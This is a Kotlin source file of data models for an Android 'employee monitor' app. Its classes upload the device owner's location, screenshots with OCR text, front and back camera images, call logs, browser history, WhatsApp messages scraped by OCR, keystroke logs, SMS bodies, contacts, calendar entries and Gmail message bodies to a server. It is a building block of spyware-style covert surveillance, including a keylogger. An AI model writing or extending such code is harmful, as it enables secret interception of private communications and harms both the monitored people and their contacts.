package com.empresa.monitor.data.model

import com.google.gson.annotations.SerializedName

// ─── Auth ─────────────────────────────────────────────
data class LoginRequest(val email: String, val password: String)
data class LoginResponse(@SerializedName("access_token") val accessToken: String)

// ─── Device ───────────────────────────────────────────
data class DeviceRegisterRequest(
    @SerializedName("device_name") val deviceName: String,
    @SerializedName("device_model") val deviceModel: String,
    @SerializedName("android_version") val androidVersion: String,
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("phone_number") val phoneNumber: String? = null,
    @SerializedName("employee_name") val employeeName: String? = null,
    @SerializedName("employee_department") val employeeDepartment: String? = null,
)

data class DeviceResponse(val id: String, @SerializedName("device_name") val deviceName: String)

// ─── Location ─────────────────────────────────────────
data class LocationRequest(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float? = null,
    val altitude: Double? = null,
    val speed: Float? = null,
    val provider: String? = null,
    @SerializedName("recorded_at") val recordedAt: String,  // ISO 8601
)

// ─── App Usage ────────────────────────────────────────
data class AppUsageRequest(
    @SerializedName("package_name") val packageName: String,
    @SerializedName("app_name") val appName: String,
    @SerializedName("duration_seconds") val durationSeconds: Long,
    @SerializedName("recorded_at") val recordedAt: String,
)

// ─── Screenshot ───────────────────────────────────────
data class ScreenshotRequest(
    @SerializedName("image_url") val imageUrl: String,
    @SerializedName("app_package") val appPackage: String? = null,
    @SerializedName("app_name") val appName: String? = null,
    @SerializedName("ocr_text") val ocrText: String? = null,
    @SerializedName("captured_at") val capturedAt: String,
)

// ─── Camera ───────────────────────────────────────────
data class CameraImageRequest(
    @SerializedName("image_url") val imageUrl: String,
    @SerializedName("camera_type") val cameraType: String,  // front, back
    @SerializedName("captured_at") val capturedAt: String,
)

// ─── Call Record ──────────────────────────────────────
data class CallRecordRequest(
    @SerializedName("phone_number") val phoneNumber: String,
    @SerializedName("contact_name") val contactName: String? = null,
    @SerializedName("call_type") val callType: String,  // incoming, outgoing, missed
    @SerializedName("duration_seconds") val durationSeconds: Int = 0,
    @SerializedName("recorded_at") val recordedAt: String,
)

// ─── Browser History ──────────────────────────────────
data class BrowserHistoryRequest(
    val url: String,
    val title: String? = null,
    val browser: String? = null,
    @SerializedName("visited_at") val visitedAt: String,
)

// ─── WhatsApp OCR ─────────────────────────────────────
data class WhatsAppOcrRequest(
    @SerializedName("contact_name") val contactName: String? = null,
    @SerializedName("contact_number") val contactNumber: String? = null,
    @SerializedName("is_business") val isBusiness: Boolean = false,
    val messages: List<WhatsAppMessageRequest>,
)

data class WhatsAppMessageRequest(
    val sender: String,  // "me" or contact name
    @SerializedName("message_text") val messageText: String? = null,
    @SerializedName("message_type") val messageType: String = "text",
    val source: String = "ocr",  // notification, ocr, screenshot
    @SerializedName("is_read") val isRead: Boolean = true,
    @SerializedName("recorded_at") val recordedAt: String,
)

// ─── Alert ────────────────────────────────────────────
data class AlertRequest(
    @SerializedName("alert_type") val alertType: String,
    val severity: String = "info",
    val title: String,
    val description: String? = null,
)

// ─── Battery ──────────────────────────────────────────
data class BatteryRequest(
    val level: Int,
    @SerializedName("is_charging") val isCharging: Boolean = false,
    val temperature: Float? = null,
    val voltage: Int? = null,
    val technology: String? = null,
)

// ─── KeyLog ────────────────────────────────────────────
data class KeyLogRequest(
    @SerializedName("app_package") val appPackage: String? = null,
    @SerializedName("app_name") val appName: String? = null,
    val text: String,
    @SerializedName("event_type") val eventType: String = "text_changed",
)

// ─── Phase 1 Extended API models ─────────────────────
data class SmsApiRequest(
    @SerializedName("sms_id") val smsId: Long,
    val address: String,
    @SerializedName("contact_name") val contactName: String?,
    val body: String,
    val type: Int,
    val date: String, // ISO 8601
    @SerializedName("is_mms") val isMms: Boolean = false,
    val read: Boolean = true
)

data class ContactApiRequest(
    val name: String?,
    val phone: String,
    @SerializedName("phone_type") val phoneType: Int?,
    val email: String?,
    @SerializedName("photo_url") val photoUrl: String?,
    @SerializedName("times_contacted") val timesContacted: Int = 0,
    @SerializedName("last_time_contacted") val lastTimeContacted: String?,
    val starred: Boolean = false
)

data class CalendarApiRequest(
    @SerializedName("event_id") val eventId: Long,
    val title: String?,
    val description: String?,
    @SerializedName("event_location") val eventLocation: String?,
    @SerializedName("start_time") val startTime: String, // ISO
    @SerializedName("end_time") val endTime: String,     // ISO
    @SerializedName("all_day") val allDay: Boolean = false,
    val organizer: String?,
    @SerializedName("calendar_name") val calendarName: String?
)

data class WifiApiRequest(
    val ssid: String,
    val bssid: String?,
    val capabilities: String?,
    val frequency: Int?,
    val rssi: Int?,
    @SerializedName("is_connected") val isConnected: Boolean = false,
    @SerializedName("ip_address") val ipAddress: String?,
    @SerializedName("link_speed") val linkSpeed: Int?
)

data class GmailApiRequest(
    val sender: String?,
    @SerializedName("sender_email") val senderEmail: String?,
    val recipient: String?,
    val subject: String?,
    val body: String?,
    val timestamp: String, // ISO
    @SerializedName("is_read") val isRead: Boolean = false
)

data class DeviceLogApiRequest(
    @SerializedName("log_type") val logType: String,
    @SerializedName("data_json") val dataJson: String
)
